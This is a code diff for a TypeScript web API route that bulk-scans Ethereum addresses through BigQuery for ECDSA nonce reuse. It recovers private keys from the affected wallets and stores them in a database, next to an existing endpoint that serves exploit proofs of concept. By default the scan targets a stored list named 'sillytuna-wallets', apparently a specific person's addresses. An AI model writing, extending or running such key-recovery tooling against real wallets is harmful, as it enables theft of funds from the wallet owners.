@@ -19,6 +19,7 @@ import { detectChain, getScanPlan } from "../lib/scheme-auditor/chain-detector";
 import { adaptiveScan } from "../lib/scheme-auditor/adaptive-scan";
 import { requireAdmin } from "../middlewares/requireAdmin";
 import { createBatchJob, getReportsDir } from "../lib/scheme-auditor/batch-worker";
+import { bulkScanViaBigQuery, isBigQueryConfigured } from "../lib/ecdsa-analyzer/bigquery-scanner";
 import fs from "fs";
 import path from "path";
 
@@ -899,6 +900,91 @@ router.get("/exploits/:category", (req: Request, res: Response) => {
   const poc = generateExploit(req.params.category, req.params.category);
   if (!poc) return res.status(404).json({ error: "No exploit PoC for this category" });
   res.json(poc);
+});
+
+// ── BigQuery bulk r-value scan ────────────────────────────────────────────────
+// POST /api/quantum/bigquery-scan
+// Body: { addresses: string[] }   (or omit to use the current job-5 wallet list)
+router.post("/bigquery-scan", requireAdmin, async (req: Request, res: Response) => {
+  if (!isBigQueryConfigured()) {
+    return res.status(400).json({
+      error: "GOOGLE_BIGQUERY_KEY not configured",
+      instructions: [
+        "1. Go to console.cloud.google.com",
+        "2. IAM & Admin → Service Accounts → Create service account",
+        "3. Grant roles: BigQuery User + BigQuery Data Viewer",
+        "4. Keys tab → Add Key → JSON → download the file",
+        "5. Copy the ENTIRE JSON content into Secrets as GOOGLE_BIGQUERY_KEY",
+      ],
+    });
+  }
+
+  try {
+    let addresses: string[] = req.body?.addresses ?? [];
+
+    // If no addresses supplied, pull from the current wallet job target file
+    if (addresses.length === 0) {
+      const [job] = await db.select().from(batchScanJobsTable)
+        .where(eq(batchScanJobsTable.sourceName, "sillytuna-wallets"))
+        .orderBy(desc(batchScanJobsTable.id))
+        .limit(1);
+
+      if (job?.targetsFile && fs.existsSync(job.targetsFile)) {
+        addresses = fs.readFileSync(job.targetsFile, "utf8")
+          .split("\n").map(l => l.trim()).filter(l => l.startsWith("0x"));
+      }
+    }
+
+    if (addresses.length === 0) {
+      return res.status(400).json({ error: "No addresses provided and no wallet job found" });
+    }
+
+    res.json({ status: "started", addressCount: addresses.length, message: "BigQuery scan running in background — check server logs for results" });
+
+    // Run async in background
+    setImmediate(async () => {
+      try {
+        const results = await bulkScanViaBigQuery(addresses);
+        const vulnerable = results.filter(r => r.hasVulnerability);
+        const keysFound  = vulnerable.filter(r => r.nonceReusePairs.some(p => p.recovery.success && p.recovery.addressMatches));
+
+        // Save any key finds to the DB
+        for (const r of keysFound) {
+          const pair = r.nonceReusePairs.find(p => p.recovery.success && p.recovery.addressMatches)!;
+          await db.insert(batchScanResultsTable).values({
+            jobId:              null,
+            target:             r.address,
+            detectedChain:      "ethereum",
+            displayName:        "Ethereum (ETH) — BigQuery",
+            schemeLabel:        "secp256k1-ecdsa",
+            signatureScheme:    "secp256k1-ecdsa",
+            hasVulnerability:   true,
+            vulnerabilityCount: r.nonceReusePairs.length,
+            recoveredPrivateKey: pair.recovery.privateKey,
+            recoveredNonceK:    pair.recovery.nonceK,
+            sharedRValue:       pair.sharedR,
+            rawResult:          r as unknown as Record<string, unknown>,
+          });
+        }
+
+        console.log(`BigQuery scan complete: ${results.length} addresses, ${vulnerable.length} vulnerable, ${keysFound.length} keys recovered`);
+      } catch (err) {
+        console.error("BigQuery scan failed:", err);
+      }
+    });
+  } catch (err) {
+    res.status(500).json({ error: String(err) });
+  }
+});
+
+// GET /api/quantum/bigquery-status — check if BigQuery is configured
+router.get("/bigquery-status", requireAdmin, (_req: Request, res: Response) => {
+  res.json({
+    configured: isBigQueryConfigured(),
+    message: isBigQueryConfigured()
+      ? "BigQuery is configured — ready to run bulk scans"
+      : "Set GOOGLE_BIGQUERY_KEY in secrets to enable BigQuery scanning",
+  });
 });
 
 export default router;
